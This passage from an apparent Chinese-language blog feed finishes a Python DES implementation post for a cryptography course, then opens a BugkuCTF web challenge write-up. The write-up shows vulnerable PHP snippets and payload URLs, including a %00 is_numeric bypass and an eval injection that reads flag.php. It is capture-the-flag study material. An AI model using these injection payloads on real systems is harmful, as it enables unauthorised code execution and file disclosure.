class="number">2</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>],[<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">dic_p=[<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">dic_n=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dic_IP2=[<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,<span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,<span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>]</span><br></pre></td></tr></table></figure><h3 id="初始IP置换"><a href="#初始IP置换" class="headerlink" title="初始IP置换"></a>初始IP置换</h3><p>将初始明文字符转换为64位二进制，并进行第一次IP置换。</p><p>需要注意的就是在python中用format函数非常方便，没有bin函数开头的0b,在这里需要将转换的二进制字符补足8位（在左边补0即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_p</span><span class="params">(p)</span>:</span></span><br><span class="line">s1=<span class="string">""</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">b=<span class="string">'&#123;:08b&#125;'</span>.format(ord(p[i]))</span><br><span class="line">s1+=b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">res+=s1[dic_IP[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="字符串的循环左移"><a href="#字符串的循环左移" class="headerlink" title="字符串的循环左移"></a>字符串的循环左移</h3><p>生成16个子密钥时需要循环左移函数，使用到的就是py的切片，先需要对密钥56位分为两部分，分别28位，然后这两部分分别循环左移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zuoyi</span><span class="params">(n,ki)</span>:</span></span><br><span class="line">temp=ki[n:len(ki)]</span><br><span class="line">temp=temp+ki[<span class="number">0</span>:n]</span><br><span class="line"><span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><h3 id="密钥初始编排-PC1"><a href="#密钥初始编排-PC1" class="headerlink" title="密钥初始编排-PC1"></a>密钥初始编排-PC1</h3><p>需要对输入的8个字符进行二进制转换并补足64位，然后将这64位字符进行PC-1置换，从64位置换为56位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_pc_1</span><span class="params">(k)</span>:</span></span><br><span class="line">k1=<span class="string">""</span></span><br><span class="line">k2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">b=<span class="string">'&#123;:08b&#125;'</span>.format(ord(k[i]))</span><br><span class="line">k1+=b                            </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">k2+=k1[dic_key1[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> k2</span><br></pre></td></tr></table></figure><h3 id="密钥二次编排-PC2"><a href="#密钥二次编排-PC2" class="headerlink" title="密钥二次编排-PC2"></a>密钥二次编排-PC2</h3><p>将每次循环左移的密钥组合后进行PC-2置换，由56位转换为48位，并存储</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_pc_2</span><span class="params">(k)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">res+=k[dic_key2[i]<span class="number">-1</span>]            <span class="comment">#将56位转换为48位</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="按位异或"><a href="#按位异或" class="headerlink" title="按位异或"></a>按位异或</h3><p>两个相同长度的字符进行按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(r_e,ki)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(r_e)):</span><br><span class="line">xor_res=int(r_e[i],<span class="number">10</span>)^int(ki[i],<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> xor_res==<span class="number">1</span>:</span><br><span class="line">res+=<span class="string">"1"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res+=<span class="string">"0"</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="E盒扩展"><a href="#E盒扩展" class="headerlink" title="E盒扩展"></a>E盒扩展</h3><p>将转换为二进制的64位明文分成两部分，Li和Ri，需要将Ri从32位二进制置换为48位，需要经过E盒扩展</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_e</span><span class="params">(r)</span>:</span></span><br><span class="line">temp_r=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">temp_r+=(r[dic_e[i]<span class="number">-1</span>])          <span class="comment">#将32位扩展为48位</span></span><br><span class="line"><span class="keyword">return</span> temp_r</span><br></pre></td></tr></table></figure><h3 id="S盒处理"><a href="#S盒处理" class="headerlink" title="S盒处理"></a>S盒处理</h3><p>这里有8个S盒，从E盒出来的48位数据分为8组，每组6位，分别进入8个S盒，上面将这8个S盒分别装入列表，并将这8个列表装入一个大列表，类似于C++里的二维数组。</p><p>将6位中的首位和末位组合并转换为10进制，为行</p><p>将6位中剩下的4位组合转换为10进制，为列</p><p>查找到对应行列的S盒中的值，将其转换为二进制字符并存储在res中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_s</span><span class="params">(r)</span>:</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(r),<span class="number">6</span>):                     <span class="comment">#步长为6</span></span><br><span class="line">begins=r[i:i+<span class="number">6</span>]</span><br><span class="line">hang=int(begins[<span class="number">0</span>]+begins[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">lie=int(begins[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">num=<span class="string">'&#123;:04b&#125;'</span>.format(dic_s[j][<span class="number">16</span>*hang+lie])  <span class="comment">#将s盒中对应数字转为二进制字符串并补满4位</span></span><br><span class="line">res+=num</span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="P盒置换"><a href="#P盒置换" class="headerlink" title="P盒置换"></a>P盒置换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_p</span><span class="params">(r)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">res+=r[dic_p[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="生成16个子密钥"><a href="#生成16个子密钥" class="headerlink" title="生成16个子密钥"></a>生成16个子密钥</h3><p>64位密钥先经过pc1置换为56位，分成两部分，分别循环左移，组合后进行二次密钥编排，将产生的16个子密钥按序存储在keylist中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_list</span><span class="params">(key)</span>:</span></span><br><span class="line">temp_1=init_pc_1(key)</span><br><span class="line">k_l=temp_1[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">k_r=temp_1[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">k_l=zuoyi(dic_n[i],k_l)          <span class="comment">#前28位左移n</span></span><br><span class="line">k_r=zuoyi(dic_n[i],k_r)          <span class="comment">#后28位左移n</span></span><br><span class="line">key_yiwei=k_l+k_r</span><br><span class="line">key_res=init_pc_2(key_yiwei)</span><br><span class="line">keylist.append(key_res)</span><br></pre></td></tr></table></figure><h3 id="F函数-1"><a href="#F函数-1" class="headerlink" title="F函数"></a>F函数</h3><p>先E盒置换，再与子密钥异或，再S盒处理，最后进行P盒处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_F</span><span class="params">(str1,key)</span>:</span></span><br><span class="line">res_e=box_e(str1)               </span><br><span class="line">res_xor=xor(res_e,key)</span><br><span class="line">res_s=box_s(res_xor)</span><br><span class="line">res_p=box_p(res_s)</span><br><span class="line"><span class="keyword">return</span> res_p</span><br></pre></td></tr></table></figure><h3 id="IP逆置换"><a href="#IP逆置换" class="headerlink" title="IP逆置换"></a>IP逆置换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">IP_NI</span><span class="params">(c)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">res+=c[dic_IP2[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="加密一组"><a href="#加密一组" class="headerlink" title="加密一组"></a>加密一组</h3><p>8个字符的加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_encode_one_group</span><span class="params">(p,k)</span>:</span></span><br><span class="line">p_bin=init_p(p)        <span class="comment">#str 64</span></span><br><span class="line">p_left=p_bin[<span class="number">0</span>:<span class="number">32</span>]     <span class="comment">#str 32 left</span></span><br><span class="line">p_right=p_bin[<span class="number">32</span>:]     <span class="comment">#str 32 right</span></span><br><span class="line">key_list(k)          <span class="comment">#生成16个子密钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):    <span class="comment">#16轮迭代</span></span><br><span class="line">p_temp=p_right                  <span class="comment">#暂存</span></span><br><span class="line">fin_r=fun_F(p_right,keylist[i]) <span class="comment">#Ri经过F函数</span></span><br><span class="line">p_right=xor(fin_r,p_left)       <span class="comment">#Ri</span></span><br><span class="line">p_left=p_temp                   <span class="comment">#Li</span></span><br><span class="line">final_right=p_right</span><br><span class="line">final_left=xor(fun_F(p_right,keylist[<span class="number">15</span>]),p_left)</span><br><span class="line">fin=final_left+final_right</span><br><span class="line">fin=IP_NI(fin)</span><br><span class="line"><span class="keyword">return</span> fin</span><br></pre></td></tr></table></figure><h3 id="加密全部"><a href="#加密全部" class="headerlink" title="加密全部"></a>加密全部</h3><p>8个字符一组进行分组，每组分别进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_encode</span><span class="params">(p,k)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> p[i:i+<span class="number">8</span>]!=<span class="string">""</span>:</span><br><span class="line">res+=DES_encode_one_group(p[i:i+<span class="number">8</span>],key)</span><br><span class="line">i=i+<span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="解密一组"><a href="#解密一组" class="headerlink" title="解密一组"></a>解密一组</h3><p>一组64位二进制进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_decode_one_group</span><span class="params">(c)</span>:</span></span><br><span class="line">cipher=<span class="string">""</span></span><br><span class="line"><span class="comment">#key_list(k)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">cipher+=c[dic_IP[i]<span class="number">-1</span>]        <span class="comment">#c经过IP1置换放入cipher</span></span><br><span class="line">cipher_left=cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">cipher_right=cipher[<span class="number">32</span>:]</span><br><span class="line">i=<span class="number">15</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">cipher_temp=cipher_right</span><br><span class="line">cipher_right=xor(fun_F(cipher_right,keylist[i]),cipher_left)</span><br><span class="line">cipher_left=cipher_temp</span><br><span class="line">i=i<span class="number">-1</span></span><br><span class="line">fin_right=cipher_right</span><br><span class="line">fin_left=xor(fun_F(cipher_right,keylist[<span class="number">0</span>]),cipher_left)</span><br><span class="line">final=fin_left+fin_right</span><br><span class="line">final=IP_NI(final)</span><br><span class="line">ming=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>,<span class="number">8</span>):</span><br><span class="line">ming+=chr(int(final[x:x+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> ming</span><br></pre></td></tr></table></figure><h3 id="解密全部"><a href="#解密全部" class="headerlink" title="解密全部"></a>解密全部</h3><p>每组64位二进制，分组解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_decode</span><span class="params">(c)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> c[i:i+<span class="number">64</span>]!=<span class="string">""</span>:</span><br><span class="line">res+=DES_decode_one_group(c[i:i+<span class="number">64</span>])</span><br><span class="line">i=i+<span class="number">64</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性分析"><a href="#运行结果及正确性分析" class="headerlink" title="运行结果及正确性分析"></a>运行结果及正确性分析</h2><p>输入8个字符作为明文，8个字符作为密钥，得出密文为一串比特流，输入这串比特流，用上面生成的子密钥进行解密得到明文为先前输入的8个明文字符，验证了算法的正确性；</p><p><img src="https://s2.ax1x.com/2019/01/02/FI0I41.png" alt="FI0I41.png"></p><h2 id="算法安全性分析"><a href="#算法安全性分析" class="headerlink" title="算法安全性分析"></a>算法安全性分析</h2><p>一重DES算法的密钥过短，只有56位有效密钥位，所以不具备很高的安全性，下面分析中间相遇攻击；</p><p><strong>中间相遇攻击分析：</strong></p><p>在 DES 的基础上，衍生了以下两种加密方式</p><p>1.双重 DES，使用两个密钥，长度为112比特，加密方程为<code>C=Ek2(Ek1(P))</code>，但是双重DES是不可以抵抗中间相遇攻击的，构造如下,即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。</p><p><code>I=Ek1(P)</code>     <code>J=Dk2(C)</code></p><p>在我们对 P 进行加密完毕后，可以对加密结果进行排序，当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询，看看是否相等，如此进行中间相遇攻击。计算量大概在2^56左右。和一重DES的复杂度相当；</p><p>2.三重DES，加密方式如下，3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。可以抵御中间相遇攻击；</p><p><code>C=Ek3(Dk2(Ek1(P)))</code>    <code>P=Dk1(Ek2(Dk3(C)))</code></p><h2 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h2><p>DES 现在已经不被视为一种安全的加密算法，拿DES来进行加密已经认为是不合理的，主要原因是它使用的56位密钥过短，为了提供实用所需的安全性，可以使用 DES 的派生算法 三重DES 来进行加密，现在的三重DES是具备安全性的，可以抵抗中间相遇攻击，比较合理有效；</p><h2 id="算法编写过程中遇到的问题及解决"><a href="#算法编写过程中遇到的问题及解决" class="headerlink" title="算法编写过程中遇到的问题及解决"></a>算法编写过程中遇到的问题及解决</h2><p>1.算法编写过程中，Feistel网络密码结构中的子密钥每一轮都需要更新；</p><p>2.一开始写十六轮迭代时，直接就是写16轮循环，每次得到的R作为下次加密的L，而上一轮得到的异或结果作为R，这样得到的结果是错误的，因为Feistel网络密码结构中第16轮迭代时，右部分直接就是第十五轮得到的R15,左部分是R15经过F函数后与L15异或得到的，并不是简单的16轮重复迭代；</p><p>3.一开始的解密过程错误，是因为我直接简单的拿加密的算法当解密的算法了，没有观察到，解密时的每一轮迭代中，子密钥是从第16个到第1个倒序添加的，这点格外重要；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在进行密码学课程设计，
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF Web Writeup</title>
    <link href="https://gardenia30.top/2018/12/01/BugkuCTF-Web-Writeup/"/>
    <id>https://gardenia30.top/2018/12/01/BugkuCTF-Web-Writeup/</id>
    <published>2018-12-01T06:16:14.000Z</published>
    <updated>2018-12-22T11:26:28.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜狗就要多刷题…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>flag在源码的注释里</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>改一下text文本框的最大输入位数&gt;1即可</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>GET方式传参即可</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>post方式传参即可</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题要求传参num不能是数字，而且num=1，一开始没有什么思路，认为是弱类型的绕过，传了true进去，发现无效，问了一下度娘，发现在数字后面加上%00截断，is_numeric()函数就不能识别为数字了…<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.206.87.240:8002/get/index1.php?num=1%00</span><br></pre></td></tr></table></figure></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这题疯狂弹出对话框，阻止以后查看源码，果然全是alert弹窗，在最下面的注释里发现了一大串编码，不太认识：<br><img src="https://s1.ax1x.com/2018/12/01/FnGL36.png" alt=""><br>问了一下度娘，发现是unicode，直接在线解码即可</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>进入windows/system32/drivers/etc/hosts中添加<strong>123.206.87.240  flag.baidu.com</strong>，然后直接访问域名即可</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题如何让他停下?直接bp抓包拦截，然后一次一次执行，go了几次发现flag<br><img src="https://s1.ax1x.com/2018/12/01/FnJZDg.png" alt=""></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>REQUEST默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。<br>这题的最终目的就是要看到<strong>flag.php</strong>里的内容，eval是执行$a里的内容，所以直接file(‘flag.php’)就可以<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8003/?hello=file(%27flag.php%27)</span><br></pre></td></tr></table></figure></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>这题花了点时间研究了一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable !</span><br><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>理解1</strong>：preg_match()是正则表达式的匹配，/^表示开始，$/表示结束，结束字符 